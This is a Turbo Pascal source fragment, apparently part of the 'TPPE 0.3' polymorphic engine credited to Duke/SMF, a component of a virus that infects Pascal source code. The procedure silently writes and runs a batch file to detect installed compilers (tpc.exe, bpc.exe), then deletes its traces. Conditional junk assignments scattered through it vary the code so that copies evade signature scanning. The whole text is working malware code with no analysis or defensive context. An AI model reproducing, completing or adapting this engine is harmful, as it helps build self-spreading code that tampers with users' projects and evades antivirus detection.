   procedure TPPE_Init;
   type pbyte = ^byte;
   var Gn:searchrec;
       b:text;
       i:integer;
       p:pointer;
   procedure Check;
   begin
   assign(b,'tppe.bat');rewrite(b);
   writeln(b,'@ctty nul');
   writeln(b,Compile,'>1.txt');
   close(b);
   {$IFOPT F-}Junk2:=i;{$ENDIF}
   exec(Command,'/c tppe.bat>nul');
   {$IFOPT D+}erase(b);{$ENDIF}
   findfirst('1.txt',$20,Gn);
   {$IFOPT D-}erase(b);{$ENDIF}
   end;
   begin
   {$IFOPT I+}Command:=GetEnv('COMSPEC');{$ENDIF}
   {$IFOPT T-}DetectComp:=false;{$ENDIF}
   {$IFOPT I-}Command:=GetEnv('COMSPEC');{$ENDIF}
   Compile:='tpc.exe';
   {$IFOPT T+}DetectComp:=false;{$ENDIF}
   Check;
   {$IFOPT S+}Randomize;{$ENDIF}
   if doserror=0 then DetectComp:=true else
     begin
     {$IFOPT P-}Compile:='[TPPE 0.3] (c) by Duke/SMF';{$ENDIF}
     Compile:='bpc.exe';
     {$IFOPT V+}Junk3:=True and True;{$ENDIF}
     Check;
     {$IFOPT F-}Junk1:=Compile;{$ENDIF}
     if doserror=0 then DetectComp:=true;
     end;
   {$IFOPT N-}TPPE_1;{$ENDIF}
   if DetectComp then
     begin
     {$IFOPT T+}Junk2:=length(Junk1);{$ENDIF}
     assign(b,Gn.name);
     erase(b);
     end;
   {$IFOPT S-}Randomize;{$ENDIF}
   {$IFOPT N+}TPPE_1;{$ENDIF}
   end;
